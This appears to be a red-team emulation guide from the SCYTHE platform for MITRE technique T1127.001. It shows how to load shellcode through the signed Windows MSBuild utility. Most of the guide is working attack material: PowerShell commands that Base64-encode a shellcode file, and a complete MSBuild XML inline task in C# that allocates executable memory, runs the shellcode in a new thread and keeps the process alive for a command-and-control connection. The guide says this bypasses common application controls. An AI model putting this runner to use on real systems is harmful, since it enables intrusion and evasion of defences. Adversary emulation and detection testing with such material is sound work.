# T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild

This SCYTHE Compound Action leverages the native Windows utility MSBuild to execute malicious code. This is a LOLBAS attack that uses the MSBuild compiler to dynamically compile and execute C# code contained within an XML file. The C# code decodes and runs shellcode, which runs within the MSBuild.exe process. Since the MSBuild executable is digitally signed by Microsoft, this attack is also a bypass of many common Application Controls. For more about abuse of MSBuild: https://attack.mitre.org/techniques/T1127/001/ 

## Obtaining the Shellcode

First, you must obtain shellcode that loads the malicious payload you wish to execute. In this Compound Action, we will use shellcode generated by SCYTHE.

Create a Campaign in the SCYTHE UI. Then, follow the instructions below depending on your version of SCYTHE.

### Pre-3.4

In the Campaign List, select the Campaign that you created to view its detailed page. Click the "More Actions..." dropdown menu, and select "Direct-Downloads Links". You will be shown a list of download links. Each is the SCYTHE client in a different executable format. To download the shellcode format, choose either the 32-bit or 64-bit "Reflective Loader + DLL" link and paste it into your browser. The shellcode should begin downloading.

### 3.4

In the Campaign List, select the Campaign that you created to view its detailed page. Click the "Download" button. You will be shown a "Download Campaign Client" menu. Select your preferred architecture (64-bit or 32-bit) and "Shellcode + DLL" for the File Type. Click the Download SCYTHE Client button. The shellcode should begin downloading.

## Creating the Shellcode Runner

Transform the shellcode file into a Base64 format. You may do this however you like, but any easy method is the following:

1) Open a PowerShell prompt and use the following code to transform the .bin file into a Base64-string. 

    * Edit the path to the appropriate path for your .bin file.
    * Ensure you have double "\\\\" between directories in the string.
```powershell
$filename = "C:\\Users\\User\\Downloads\\test1_scythe_client32.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```
 
2) You will now have a large Base64 string in your clipboard that you may paste elsewhere. Create a new XML file with and paste the following into it, replacing the existing Base64 string:

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<!-- This inline task executes shellcode. This example XML file is modified from an example payload created by Casey Smith. It has been modified to support non-blocking shellcode loaders.-->
<!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
<!-- Save This File And Execute The Above Command -->
<!-- Authors: Casey Smith, Twitter: @subTee , The Wover-->
<!-- License: BSD 3-Clause -->
<Target Name="Run">
<ClassExample />
</Target>
<UsingTask
TaskName="ClassExample"
TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
        <Code Type="Class" Language="cs">
            <![CDATA[
            using System;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            public class ClassExample :  Task, ITask
            {         
                private static UInt32 MEM_COMMIT = 0x1000;
                private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                [DllImport("kernel32")]
                private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

                [DllImport("kernel32")]
                private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

                [DllImport("kernel32")]
                private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

                public override bool Execute()
                {
                //replace with your own shellcode
                    string b64 = "YOmlAgAAW4PsKInliV0Ag8MAZKEwAAA.....AAAAAAAAAA=";
                    byte[] shellcode = System.Convert.FromBase64String(b64);
                    
                    UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;
                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);

                    // Loop endlessly to prevent the process from exiting
                    int x = 0;
                    for (int i = 0; i==i; i++) 
                    {
                        x = i;
                        x++;
                    }
                    return true;
                } 
            }     
            ]]>
            </Code>
        </Task>
    </UsingTask>
</Project>
```

3) When you replace the existing base64 string with your own, keep in mind the following. 
    * Delete the pre-existing text between the double quotes and the paste from your clipboard.
    * Make sure that there are no spaces or newlines inside of the string or between the double quotes.
4) Save the file as an XML file (such as `msbuild.xml`).
5) In your Powershell prompt, run the following command, replacing the path to the .XML file with your own:
    * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe .\msbuild.xml`
    * The SCYTHE client should connect with your SCYTHE server.
    * If the Powershell window is closed, connection will drop.